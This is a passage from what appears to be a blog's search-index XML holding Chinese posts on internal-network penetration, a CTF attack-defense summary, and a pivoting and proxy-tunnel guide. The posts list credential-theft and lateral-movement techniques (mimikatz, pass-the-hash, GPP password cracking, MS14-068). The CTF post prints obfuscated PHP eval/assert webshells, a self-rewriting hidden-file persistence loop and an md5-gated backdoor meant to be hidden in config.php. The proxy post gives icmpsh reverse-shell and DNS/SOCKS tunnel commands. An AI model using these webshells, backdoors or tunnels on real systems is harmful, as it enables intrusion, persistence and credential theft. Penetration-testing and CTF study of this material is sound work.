/F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k %%j)))]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全,内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透（持续更新）]]></title>
    <url>%2F2017%2F06%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。标：本文多数内容是整合的知识点。 前期基本信息探测尽可能详细得分析出网段信息、各部门ip段、重点找出IT运维部、OA、邮箱服务器、人力资源管理等。最后画一张组织结构图，这样在内网定位的时候，无论是针对内网查找资料还是针对特殊任务都是非常实用的一项技术。不过信息收集，不是一天两天就能完成的事情，这种事情要持之以恒。 人事组织结构图demo: 思路：这种人事图，除了在外部站点上有，也可以到首页去查找关于我们，有一些简单的说明，然后再去招聘网找各式的岗位名称，最后连蒙带猜（没有这样的操作），收集尽量精确能到各个人员。当然，想要详细，就得通过不同的渠道获取。 ip分布思路： 一般大公司有内部门户系统，可通过内部门户系统公开链接找出部门ip段（如果找到路由也很惊喜） 内网中可通过路由器、交换机等设备命令执行、snmp、弱口令获取网络拓扑 切入点（起点） Web门户系统getshell—-&gt;system权限； 邮件服务器； 邮件服务器获取信息中得出VPN账密和IP地址； 路由器建立VPN进入； 待更新… 靶机信息收集主要针对三种： 基于命令形式的，包括权限信息，机器信息，进程端口，网络连接，共享、会话等等； 基于应用与文件形式的，例如一些敏感文件，密码文件，浏览器，远程连接客户端等； 还有一种是最直接的，例如抓取本地明文与hash，键盘记录，屏幕记录等。 网上已经有大量相关的资源与文章了，这里就不再占篇幅了，只说点额外的不常见技巧。 命令行形式包括但不限于一下几点 常用命令123456789101112hostname #主机名systeminfo #系统信息（所在域，开机时间，安装信息，补丁情况，系统版本）set #环境变量net user #查看默认用户net view #显示当前域或工作组中计算机的列表net localgroup #查看用户组net localgroup Administrators #查看Administrators组所有用户(包括隐藏用户)query user #查看当前会话（window7 64以上）tasklist /v #显示当前进程和进程用户net config workstation #查看当前登陆用户信息net statistics workstation #查看主机开机时间net share #查看共享文件夹 不常用命令12345678910whoami /all 查看Mandatory Label看我们是否过uacnet session 查看有没有远程连过来的sessioncmdkey /l 看是否保存了登陆凭证.（凭据管理器）echo %logonserver% 查看登陆域net stitastics server 查看登陆时间Wmic 能让攻击者大量利用来获取系统信息的系统自带工具 wmic qfe list #获取补丁信息Netsh 做端口转发spn –l administrator 域内查某个用户spn记录dsquery | nltest 域内信息收集 应用与文件形式虽然标题不错，但是内容只是去翻文件，包括一些应用的配置文件，密码文件等。有时候会碰到一些加密的office办公软件，例如word,excel 这些。 如果是低版本如2003的话，攻击者会在百度搜一些网上的破解软件进行破解（会联网）。如果是高版本的话，往往在目标用户开着文件时使用微软SysinternalsSuite套装中的procdump将内存dump回去，用内存查看器直接查看文件内容。 因此就算有些敏感文件加密了照样能够被攻击者获取敏感信息。 hash和明文这一步使用mimikatz基本就足够了，也分exe、dll与ps三个版本，攻击者会分情况使用。屏幕截图在windows中也有系统自带psr命令能够做截图等等（但是只有windows7以上才会有）。低版本的可以使用nircmd，使用为：nircmdc.exe savescreenshot 1.png。 网络环境的判断 机器所处位置区域的判断; 机器角色的判断; 进出口流量是否连通的判断，是否出的去，进的来。 位置的判断位置判断是指机器处于网络拓扑中的某个区域，是在DMZ区，办公网，还是核心区，核心DB等多个位置，当然这里的区域并不是绝对的，只是大概的一个环境，不同的地方网络环境不一样，区域的界限也不一定明显。 角色的判断机器角色的判断指判断已经控制的机器是普通Web服务器、开发测试服务器、公共服务器、文件服务器还是代理服务器、DNS服务器、存储服务器等等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况进行综合判断的。 连通性的判断出口流量是否连通的判断指机器是否能上外网这些，要综合判断协议（tcp\http\dns\icmp等协议）与端口(常见能出去的端口有80,8080,443,53,110,123等)。在这里还有一种是网络内网设置了代理服务器的情况，攻击者通常会查看环境变量set，主机名是否有proxy字样的机器，注册表是否有写明代理地址或指定pac代理文件等。 横向渗透如果是workgroup横向，攻击者会尝试web漏洞挖掘、密码猜解等。如果是domain横向，方法就比较多了，例如AD2008 gpp 、ms14-068 、kerberoast 、配置错误、一直抓密码等。 代理转发渗透测试-之-代理篇 默认权限配置1234567[+]普通机器允许Console：administrator组（domain admins），users组（domain users），backup operators组允许rdp：administrator组（domain admins），Remote desktop users组[+]域控AD允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组允许rdp：administrator组，Remote desktop users组 如果出现配置错误，那就是权限配置问题。 tips：当某些普通\不普通用户加入AD的rdp组或其他管理员组，当攻击者拿到这些用户的权限时就相当于可以获取到域控制器的权限了。 远程命令执行方式例如at\schtasks\psexec\wmic\sc\ps网上有很多相关资源也不占篇幅了，只提一个很少提的。从2012r2 起，他们开了一个端口叫5985，原理跟大家常说的powershell remote是一样的，基于winrm服务，于是可以这样执行。又是一个系统自带的远程管理工具。1winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig 域管理员定位一是日志，二是会话。日志指的的本地机器的管理员日志。可以使用脚本或wevtutil导出查看会话是域内每个机器的登陆会话，可以匿名查询，无需权限。可以使用netsess.exe或powerview查询1PS C:\Users\RcoIl&gt; get-netsession -computername &quot;192.168.1.100&quot; 域内信息探测常用命令12345678910net user /domain #查看域用户net view /domain #查看有几个域net view /domain:XXX #查看此域内电脑net group /domain #查询域里面的组net group &quot;domain computers&quot; /domain #查看加入到域内的所有计算机名net group &quot;domain admins&quot; /domain #查看域管理员nltest /dclist:xxx #查看域控制器net group &quot;domain controllers&quot; /domain #查看域控制器net user hacker /domain #获得指定账户的详细信息net accounts /domain #获得域密码策略设置，密码长短，错误锁定等信息 dsquery 命令 查询 AD1234567891011dsquery computer - 查找目录中的计算机。dsquery contact - 查找目录中的联系人。dsquery subnet - 查找目录中的子网。dsquery group - 查找目录中的组。dsquery ou - 查找目录中的组织单位。dsquery site - 查找目录中的站点。dsquery server - 查找目录中的 AD DC/LDS 实例。dsquery user - 查找目录中的用户。dsquery quota - 查找目录中的配额规定。dsquery partition - 查找目录中的分区。dsquery * - 用通用的 LDAP 查询来查找目录中的任何对象。 Net系列命令获取域内信息123456789Csvde/ldifde/dsquery/adfind/ldapsearch #探测更详细信息使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）Nslookup -type=SRV_ldap._tcp #(寻找域控)tasklist /v #列出进程和进程所有者（看是否有域管登陆）PowerView #（powershell脚本 辅助找寻定位关键用户）WinScanX.exe #远程信息刺探Winfo.exe #遍历远程用户名nmap smb-enum-sessions.nse #（引擎来获取远程机器的登陆session，并且不需要管理权。）netview.exe`#(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户) linux cat /etc/nsswitch看看密码登陆策略，我可以看到使用了file ldap模式 less /etc/ldap.confbase ou=People,dc=unix-center,dc=net找到ou,dc,dc设置 查找10条用户记录ldapsearch -h 192.168.2.2 -x -z 10 -p指定端口 查看NFS连接showmount -e ip 查找管理员信息匿名方式1ldapsearch -x -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2 有密码形式1ldapsearch -x -W -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2 获取域管权限账户枚举（nbtstat -A\nmapd等）、hash注入 （mimikatz） 、bypassuac、 session切换等 组策略漏洞（GPP）域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等，这些操作有时候需要提供账号密码。当组策略进行分发时，会在SYSVOL目录下生成一个xml文件，理所当然的前面提供的账号密码都保存在这个xml文件中，而密码是经过AES加密得，也就是说完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开得AES密钥破解密码。 MS14-068 KERBEROS漏洞Benjamin Delpy(Mimikatz的作者)写了一个MS14-068的利用工具，叫Kekeo,是PyKEX的升级版。它能够找到并定位有漏洞的域控，在打了补丁和有2012/2012R2域控得情况下仍能凑效。在利用MS14-068之前，建议先使用klist /purge清除服务器端缓存的Kerberos凭据。 MS17-01017年是个好年。 相同密码登陆如果内网主机的本地管理员账户密码相同且允许本地账户登陆域内其他机器，那么可以通过以获取的hash或明文 一般步骤： 远程登陆到任意一台主机； 获取一台域用户主机的权限； Dump内存获得hash（或明文）； 通过pass the hash 或 明文 尝试登陆其他主机； 继续搜集hash 或明文 并尝试远程登陆； 直到获得域管理员账户hash，登陆域控，最终成功控制整个域 域登陆缓存mscash使用reg命令提取sam、system、security、然后用creddump7提取mscash。 利用漏洞配置不当获取更多主机权限 常见应用漏洞：struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion 常见语言反序列化漏洞php、Java、python、ruby、node.js 数据库漏洞及配置不当mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当 内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…） web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql...） 系统备份文件（ghost）中读密码 在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限推荐工具：NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe ms08-067远程溢出（极少能碰到） cmdkey /list 远程终端可信任连接连接netpass.exe读取该密码 arp欺骗中间人攻击（替换sql数据包、认证凭证获取、密码获取极大不到万不得已不会用） WPAD中间人攻击（全称网络代理自动发现协议、截获凭证该种方法不需要ARP欺骗，比较好用的一种方法（使用Responder.py/net-creds.py）） 翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站） 用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学） 定向浏览器信息ip信息定向挂马（0day） 用以收集的密码（组合变换密码）对各服务进行爆破 应用0day攻击… 做MIMT这块的两个工具12responder.py &amp;&amp;Invoke-Inveigh.ps1 ，经常被用来做信息收集。responder.py –A 分析模式 Powerview.ps1 域渗透利器最后，如果攻击者终于拿到了域控了，要做的事就是信息获取，包括全域hash（mimikatz），ldap信息(csvde)，dns信息（dnscmd）等，碰到文件占用的情况还会使用卷影复制。 除此之外攻击者还可能利用域控干点其他事，例如当问权限设置严格，攻击者所在位置访问不了目标机器，甚至域控本机也访问不了，只能是目标单向访问的情况，例如攻击者找不到目标ip，这时攻击者就可以拿出域组策略GPO这个大杀器了，当然相对应的动静会偏大。 整合参考：黑客游走于企业windows内网的几种姿势内网渗透——网络环境的判断]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>内网</tag>
        <tag>系统安全</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下攻防赛总结]]></title>
    <url>%2F2017%2F06%2FCTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。 一张常规的CTF线下攻防思维导图 SSH登陆两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。 tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。 网络拓扑首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。示例： 主机发现如果是在同个C段，或者B段，均可以使用RouterScan进行对80端口扫描进行扫描得出，嫌麻烦的话，就用httpscan这个小巧的脚本 千万要记得扫端口，这很重要。用nmap也行，自己写的脚本或者网上找的也行。 预留后门有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留） 黑盒测试 防御及修复建议1.将所有的登陆口密码进行修改（炒鸡复杂）；2.将上传页面的action地址修改为*，（机智小能手！！）；3.反序列化和命令执行，就去seebug或其他的站点找补丁；4.待补充… 一句话控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。简单举例：1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：php?2=assert密码是1。献上我常用得一句话12345678&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[C])';@assert($a.$b.$c.$d.$e);?&gt; 配置为?b=))99(rhC(tseuqeR+lave 123&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=连接密码:0（零） 权限维持1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.demo.php'; $shell = "&lt;?php phpinfo();?&gt;"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; tips:.demo.php前面使用一个点，能很好的隐藏文件。想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('demo.php'); exec('kill -9 $pid');&#125;?&gt; 先查看进程，查看对应的pid，再执行即可。 素质低的人则会放置一个md5马，比如1234&lt;?phpif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')@eval($_POST['cmd']);?&gt; 如果素质低的人又很猥琐，像rootrain这种就是。那就是利用header，最后综合起来就是12345678&lt;?phpecho 'hello';$test= 'flag';if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253') if (@$_SERVER['HTTP_USER_AGENT'] == 'flag')&#123; header("flag:$test");&#125;?&gt; 放进config.php效果最好，因为一般很少人去看这个。 flag获取上面的$shell内容看个人，线下赛可以直接使用&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;之类的，只是说一个点，剩余的发挥空间由你们思考。 最好能写一个批量上传的，结合批量访问。批量访问参考PHP-定时任务或者1234567#!/bin/bashwhile truedo flag=$(curl 'http://172.16.4.42:800') curl --cookie "PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD" --data "key="$&#123;flag&#125; "http://172.16.4.42/index.php/wargame/submit" sleep 1sdone 只有想不到，没有做不到。 日志分析日志分析的用途 感知可能正在发生的攻击，从而规避存在的安全风险 应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本这种脚本网上有很多。12345678910111213&lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数$time = date('Y-m-d H:i:s',time()); //访问时间$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";// log记录$fh = fopen("log.txt", "a");fwrite($fh, $logadd);fclose($fh);?&gt; 日志分析工具 LogForensics 腾讯实验室https://security.tencent.com/index.php/opensource/detail/15 北风飘然@金乌网络安全实验室http://www.freebuf.com/sectool/126698.html 网络ID为piaox的安全从业人员：http://www.freebuf.com/sectool/110644.html 网络ID：SecSkyhttp://www.freebuf.com/sectool/8982.html 网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html CTF总结意义所在首先，CTF题是信息安全得基本概念，攻防技术、技巧得浓缩和提炼。通过解题，会快速掌握题目中所包含得概念和技术点，而这些知识在真实得环境中可能比较分散，难以学习，高水平得CTF都是由业内专家命题，往往凝聚着他们多年积累出来的技能。 其次，CTF题注重实际操作，并与基础理论知识相结合。每道CTF都需要实际动手才能找到答案，并且在比赛中经常要拼速度，这对攻防操作得能力会有极高的锻炼。除此之外，高质量得CTF题都没法直接使用现成工具解出，一般需要在理解基本原理的基础上，自己编写代码来求解，这个过程会加深和巩固计算机基础知识得理解。 最后，CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。 不要为CTF而CTF虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试 之 代理篇]]></title>
    <url>%2F2017%2F06%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[整合个端口、代理总结，总觉得好难。慢慢来… 适用网络环境有以下几种： 服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。 判断什么端口能出来VISTA 以下 TCP1FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b telnet 151.101.73.147 %i&quot;) 用 TELNET 不停的连接你的 1-65535 端口, 你本地开个 TCPDUMP 就行了, 如果连通了, 就 OK 。 UDP1FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b nslookup -port=%i rcoil.me 151.101.73.147&quot;) 这个速度慢，但是有效。 VISTA 以后 TCP 1function sT($IP,$Port) &#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try &#123; $sock.Connect($End);[Byte[]] $Message = [char[]]&quot;w00tw00t&quot;;$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)&#125; catch &#123;&#125;;$Sock.Close();&#125;;1..65535 | %&#123; sT -IP &quot;151.101.73.147&quot; -Port $_ &#125; UDP 1function sU($IP, [int]$Port)&#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = &quot;w00tw00t&quot;;$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);&#125;; 1..65535 | %&#123; sU -IP &quot;151.101.73.147&quot; -Port $_ &#125; SSH隧道编辑/etc/ssh/sshd_config文件（服务器端）中：12345GatewayPorts yesPermitRootLogin yesPermitTunnel yes #Tunnel启用ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开 接着重启ssh服务 参数详解：123456789-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了～-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。-R：远程转发-L：本地转发-D：... 端口转发12ssh -qTfnN -L hostport:host:port -l user remote_ip #正向隧道ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道 举个例子12ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是本地端口，本地访问5555就是访问vps的5556。ssh -N -R 5555:192.168.2.100:5556 username@host # 5555是vps的端口，访问vps的5555就是访问本地的5556。 正向代理12345SSH -qTfnN -D port remotehost #直接进行socks代理ssh -qTfnN -D 6080 user@theserver #在本地终端中运行 然后在浏览器或者软件中设置好代理参数 socks5: 127.0.0.1:6080 后便可以使用.-q：静默运行 远程转发(反向)12345678910第一步：sudo python -m SimpleHTTPServer 80在目标机子开启80端口服务第二步：ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口第三步：个人PC机器直接使用语句:ssh -p 6666 -qngfNTD 6767 内网用户@VPS这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中 ICMP隧道ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限。 icmpshvps上：1234git clone https://github.com/inquisb/icmpsh.gitapt-get install python-impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207 靶机上：1icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128 就会在vps上接到一个cmdshell。 HTTP代理abptts项目地址首先,安装好工具所需的各种py依赖库:12pip install pycrypto 加密库,整个数据加密都要靠这个pip install httplib2 生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:1python abpttsfactory.py -o webshell 前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，-u 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:1python abpttsclient.py -c webshell\config.txt -u &quot;http://www.rcoil.com/abptts.aspx&quot; -f 127.0.0.1:1234/127.0.0.1:3389 隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:12mstsc 127.0.0.1:1234putty ssh root@127.0.0.1 -p 1234 -i ~/.ssh/xxx/id_rsa 如果对方的ssh只允许证书登录,加载上自己的证书即可 DNS隧道不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。 Iodine它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。使用手册Server端：1iodined -f -c -P password 1.1.1.1 tunneldomain.com Client端：1iodine -f -P password tunneldomain.com -r 成功连接将直接在客户端生成地址1.1.1.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过建立C＆C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用）。它还支持端口转发。Server端：1ruby ./dnscat2.rb tunneldomain.com Client端：1./dnscat2 tunneldomain.com 收到Server端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择一个命令会话session -i ：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as&apos;ping&apos;! For a full list of clients, try &apos;help&apos;.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。 TCP隧道shootbackshootback，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。…. SOCKS在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。 socks代理工具socks代理其实也可理解为一个增强版的 lcx，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。 网络上Socks代理工具有很多，选用的时候尽可能使用无GUI界面的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。 Earthworm工具网址：http://rootkiter.com/EarthWormEW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以正向、反向、多级级联等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。 目前已经有了最新版Termite，工具网址：http://rootkiter.com/Termite/ 官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。 正向 SOCKS v5 服务器在具有公网IP时：1./ew -s ssocksd -l 1080 反弹 SOCKS v5 服务器先在一台具有公网 ip :233.233.233.233的主机A上运行以下命令：1./ew -s rcsocks -l 1080 -e 8888 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口 1./ew -s rssocks -d 233.233.233.233 -e 8888 HackTools 可通过访问=233.233.233.233:1080端口使用 rssocks 主机提供的 socks5 代理服务 二级级联环境示意图： 环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。 12345# V2执行，利用ssocksd方式启动8888端口的socks代理./ew -s ssocksd -l 8888# V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上./ew -s lcx_tran -l 1080 -f 10.255.11.3 -g 8888# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。 1234567# VPS执行，把来自外部的1080端口的流量转到本地的8888端口上./ew –s lcx_listen –l 1080 –e 8888# V2执行，在本地启动socks5代理并监听9999端口./ew -s ssocksd -l 9999# V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.11.3 -g 9999# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 三级级联再提供一个“三级级联”的本地SOCKS测试用例以供参考环境示意图： 环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域123456789# vps上执行，把来自外部的1080端口流量转到本地的8888端口上./ew -s rcsocks -l 1080 -e 8888 # Web server执行，把vps的8888端口和内网V2的9999端口绑定./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.12.2 -g 9999 # V2执行，将来自外部的7777端口和本地的9999端口进行绑定./ew -s lcx_listen -l 9999 -e 7777 # V3执行，将本地的socks连接反弹到V2的7777端口上./ew -s rssocks -d 10.255.12.2 -e 7777 # Attack执行，使用Proxifier等建立正常的socks代理访问1080端口 数据流向: Attack(SOCKS v5) -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks 更多的内容用力戳戳瞎下面这篇文章。 内网漫游之SOCKS代理大结局这篇文章是我见过最全的SOCKS代理 参考：利用ssh端口转发实现Site-to-Site简易VPN通道利用 DNS 隧道传递数据和命令来绕过防火墙A Red Teamer’s guide to pivoting内网漫游之SOCKS代理大结局SSH如何反向代理稳定穿透内网]]></content>
      <categories>
        <category>内网渗透</category>
